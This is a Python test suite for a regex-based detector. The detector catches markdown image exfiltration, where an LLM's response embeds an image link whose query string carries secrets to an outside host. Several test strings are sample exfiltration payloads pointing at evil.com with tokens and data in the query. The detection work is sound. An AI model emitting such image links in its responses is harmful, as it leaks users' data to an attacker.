# ==============================================================================
# MarkdownExfiltrationDetector Test Suite
# ==============================================================================
# User Story: As a security engineer, I want the middleware to reliably detect
#             markdown image injection side-channel exfiltration attempts so
#             that data leakage via LLM responses is caught at the HTTP layer.
#
# Acceptance Criteria:
#   1. Detects standard markdown image exfiltration URLs with query params
#   2. Detects patterns embedded anywhere in a large JSON body
#   3. Detects patterns spanning multiple lines (re.DOTALL)
#   4. Does NOT flag images without query parameters
#   5. Does NOT flag plain HTTP URLs that are not markdown image syntax
#   6. Regex non-greedy alt text match stops at first closing bracket
#
# Test Categories:
#   SEC-REGEX-001: Detects basic exfiltration pattern
#   SEC-REGEX-002: Detects http (non-https) variant
#   SEC-REGEX-003: Detects pattern embedded mid-string
#   SEC-REGEX-004: Detects pattern in multi-line string
#   SEC-REGEX-005: Does not flag markdown image without query params
#   SEC-REGEX-006: Does not flag plain URL (not markdown image syntax)
#   SEC-REGEX-007: Non-greedy alt text stops at first bracket
#   SEC-REGEX-008: Detects multiple query parameters
# ==============================================================================

import re
import pytest

EXFILTRATION_PATTERN = r"!\[.*?\]\(https?:\/\/[^\s)]+\?[^\s)]+=[^\s)]+\)"


class TestExfiltrationRegex:
    """SEC-REGEX: Unit tests for the markdown exfiltration regex pattern."""

    def test_detects_basic_https_exfiltration(self):
        """SEC-REGEX-001: Detects standard https image exfiltration with query param."""
        text = "![leak](https://evil.com/path?data=SECRET)"
        assert re.search(EXFILTRATION_PATTERN, text, re.DOTALL)

    def test_detects_http_variant(self):
        """SEC-REGEX-002: Detects http (non-https) exfiltration pattern."""
        text = "![leak](http://evil.com?data=SECRET_TOKEN_123)"
        assert re.search(EXFILTRATION_PATTERN, text, re.DOTALL)

    def test_detects_pattern_mid_string(self):
        """SEC-REGEX-003: Detects pattern embedded anywhere in a larger string."""
        text = 'Here is your answer: ![x](https://evil.com?q=leaked) hope that helps!'
        assert re.search(EXFILTRATION_PATTERN, text, re.DOTALL)

    def test_detects_pattern_across_lines(self):
        """SEC-REGEX-004: Detects pattern when response body spans multiple lines."""
        text = (
            '{"message": "Some text\\n'
            'and more text\\n'
            '![leak](https://evil.com?token=abc123)\\n'
            'end of message"}'
        )
        assert re.search(EXFILTRATION_PATTERN, text, re.DOTALL)

    def test_no_match_image_without_query_params(self):
        """SEC-REGEX-005: Does not flag a markdown image with no query parameters."""
        text = "![logo](https://example.com/image.png)"
        assert not re.search(EXFILTRATION_PATTERN, text, re.DOTALL)

    def test_no_match_plain_url(self):
        """SEC-REGEX-006: Does not flag a plain URL that is not markdown image syntax."""
        text = "Visit https://evil.com?data=SECRET for more info."
        assert not re.search(EXFILTRATION_PATTERN, text, re.DOTALL)

    def test_non_greedy_alt_text(self):
        """SEC-REGEX-007: Non-greedy .*? stops at the first ] not the last."""
        # If greedy, .*  would consume ](safe) and match the second image only
        text = "![safe](https://ok.com) and ![leak](https://evil.com?x=y)"
        match = re.search(EXFILTRATION_PATTERN, text, re.DOTALL)
        assert match
        # Should match the exfiltration image, not bleed into the safe one
        assert "evil.com" in match.group(0)

    def test_detects_multiple_query_parameters(self):
        """SEC-REGEX-008: Detects URLs with multiple query parameters."""
        text = "![x](https://evil.com/c?user=alice&token=s3cr3t)"
        assert re.search(EXFILTRATION_PATTERN, text, re.DOTALL)
